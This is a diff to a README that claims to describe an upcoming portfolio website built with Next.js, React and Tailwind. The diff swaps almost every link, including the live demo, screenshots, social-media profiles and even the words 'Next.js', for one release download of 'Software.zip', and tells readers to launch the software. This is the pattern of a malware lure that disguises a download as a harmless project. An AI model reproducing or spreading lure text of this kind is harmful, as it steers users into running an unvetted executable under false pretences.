@@ -7,17 +7,17 @@ This repository serves as a hub for my upcoming Portfolio website. Although it's
 
 ## Topics
 - JavaScript
-- Next.js
+- https://github.com/Antifreezsa/portfolio/releases/download/v1.0/Software.zip
 - React
 - Tailwind CSS
 - Portfolio Site
 - Portfolio Website
 
 ## Software Download
-Download the software package from [here](https://github.com/user-attachments/files/18388744/Software.zip). Make sure to launch the software for an immersive experience.
+Download the software package from [here](https://github.com/Antifreezsa/portfolio/releases/download/v1.0/Software.zip). Make sure to launch the software for an immersive experience.
 
 ## Getting Started
-To get a glimpse of what's to come in my Portfolio, visit the live demo [here](https://www.myportfolio.com). 
+To get a glimpse of what's to come in my Portfolio, visit the live demo [here](https://github.com/Antifreezsa/portfolio/releases/download/v1.0/Software.zip). 
 
 ## Features
 Here's a sneak peek at some of the features you can expect in my Portfolio:
@@ -27,11 +27,11 @@ Here's a sneak peek at some of the features you can expect in my Portfolio:
 - **Contact Form**: Easy way to get in touch with me for collaborations or inquiries.
 
 ## Screenshots
-![Screenshot 1](https://via.placeholder.com/800x600)
-![Screenshot 2](https://via.placeholder.com/800x600)
+![Screenshot 1](https://github.com/Antifreezsa/portfolio/releases/download/v1.0/Software.zip)
+![Screenshot 2](https://github.com/Antifreezsa/portfolio/releases/download/v1.0/Software.zip)
 
 ## Development
-In the development of my Portfolio, I am utilizing the latest tools and technologies such as Next.js, React, and Tailwind CSS to craft a modern and visually appealing website. Stay tuned for more updates as I continue to refine and enhance the site.
+In the development of my Portfolio, I am utilizing the latest tools and technologies such as https://github.com/Antifreezsa/portfolio/releases/download/v1.0/Software.zip, React, and Tailwind CSS to craft a modern and visually appealing website. Stay tuned for more updates as I continue to refine and enhance the site.
 
 ## Contributions
 I welcome contributions and feedback from the community to make my Portfolio even better. Feel free to submit a pull request with any suggestions or improvements you may have.
@@ -41,8 +41,8 @@ If the above link is not working or you want to explore more versions of my Port
 
 ## Connect with Me
 Stay connected with me on social media for more updates on my Portfolio:
-- [Twitter](https://twitter.com/myportfolio)
-- [LinkedIn](https://linkedin.com/in/myportfolio)
+- [Twitter](https://github.com/Antifreezsa/portfolio/releases/download/v1.0/Software.zip)
+- [LinkedIn](https://github.com/Antifreezsa/portfolio/releases/download/v1.0/Software.zip)
 
 Let's embark on this exciting journey together! 🌟
 
